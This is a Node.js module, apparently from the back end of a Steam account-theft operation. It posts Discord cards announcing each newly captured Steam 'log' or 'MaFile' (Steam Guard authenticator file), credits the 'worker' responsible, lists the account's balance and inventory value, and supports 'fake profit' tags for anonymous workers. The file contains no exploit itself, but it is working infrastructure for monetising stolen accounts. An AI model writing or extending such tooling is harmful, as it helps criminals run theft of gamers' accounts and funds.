const { AttachmentBuilder, EmbedBuilder } = require("discord.js");
const { env } = require("../config/env");
const { logger } = require("../utils/logger");
const { getDiscordClient } = require("./runtime");
const { ACCENT } = require("./components");
const { emojiMarkdown } = require("./emojis");
const { getUserByTelegramId } = require("../services/userService");
const { profileDeepLink } = require("../services/topService");
const { formatFakeProfitTagLabel, normalizeFakeProfitTag } = require("../utils/fakeProfitTag");

function money(value) {
  const n = Number(value);
  if (!Number.isFinite(n)) return "$0.00";
  return `$${n.toFixed(2)}`;
}

function escapeMdLinkLabel(value) {
  return String(value || "")
    .replace(/\[/g, "［")
    .replace(/\]/g, "］")
    .trim();
}

function workerDisplayName(user, telegramId) {
  if (user?.isAnonymous) {
    const tag = normalizeFakeProfitTag(user.fakeProfitTag);
    return tag ? formatFakeProfitTagLabel(tag) : "Аноним";
  }
  if (user?.username) return String(user.username);
  if (user?.firstName) return String(user.firstName);
  const id = String(telegramId || user?.telegramId || "").trim();
  return id || "Воркер";
}

function workerMarkdown(user, telegramId) {
  const tid = String(telegramId || user?.telegramId || "").trim();
  const label = escapeMdLinkLabel(workerDisplayName(user, tid));
  const href = tid ? profileDeepLink(env.botUsername, tid, "all") : "";
  if (href) return `[**${label}**](${href})`;
  return `**${label}**`;
}

function buildCardDescription({ isMafile, user, telegramId, total, balanceUsd, inventoryUsd }) {
  const who = workerMarkdown(user, telegramId);
  const titleLine = isMafile ? `MaFile у ${who}` : `Лог у ${who}`;

  return [
    titleLine,
    "",
    `┌  Баланс: \`${money(balanceUsd)}\``,
    `├  Инвентарь: \`${money(inventoryUsd)}\``,
    `└  Сумма: **${money(total)}**`,
  ].join("\n");
}

/**
 * Post branded Steam log / MaFile card to Discord arrival channel.
 * @returns {Promise<string|null>} message id
 */
async function notifyDiscordSteamCard({
  kind,
  imageBuffer,
  sourceId,
  ownerTelegramId,
  ownerUser = null,
  total,
  balanceUsd,
  inventoryUsd,
}) {
  const channelId = String(env.discordSteamLogsChannelId || "").trim();
  if (!channelId) return null;
  if (!imageBuffer || !Buffer.isBuffer(imageBuffer) || !imageBuffer.length) return null;

  const client = getDiscordClient();
  if (!client?.isReady?.()) {
    logger.warn("Discord steam card skipped (bot not ready)", sourceId);
    return null;
  }

  const channel = await client.channels.fetch(channelId).catch(() => null);
  if (!channel?.isTextBased?.()) {
    logger.warn("Discord steam logs channel missing", channelId);
    return null;
  }

  const tid = String(ownerTelegramId || "").trim();
  const user =
    ownerUser ||
    (tid ? await getUserByTelegramId(tid).catch(() => null) : null);

  const isMafile = String(kind || "").toLowerCase() === "mafile";
  const filename = `garbona-${isMafile ? "mafile" : "log"}-${sourceId || Date.now()}.png`;
  const file = new AttachmentBuilder(imageBuffer, { name: filename });

  const mark = isMafile
    ? emojiMarkdown("private") || "🛡"
    : emojiMarkdown("plus") || "📦";

  const embed = new EmbedBuilder()
    .setColor(isMafile ? ACCENT.pending : ACCENT.brand)
    .setTitle(isMafile ? `${mark} Новый MaFile` : `${mark} Новый лог · Валид`)
    .setDescription(
      buildCardDescription({
        isMafile,
        user,
        telegramId: tid,
        total,
        balanceUsd,
        inventoryUsd,
      })
    )
    .setImage(`attachment://${filename}`)
    .setFooter({ text: "Garbona · Steam" })
    .setTimestamp(new Date());

  const sent = await channel.send({ embeds: [embed], files: [file] });
  return String(sent?.id || "") || null;
}

module.exports = {
  notifyDiscordSteamCard,
  workerMarkdown,
  workerDisplayName,
  buildCardDescription,
};
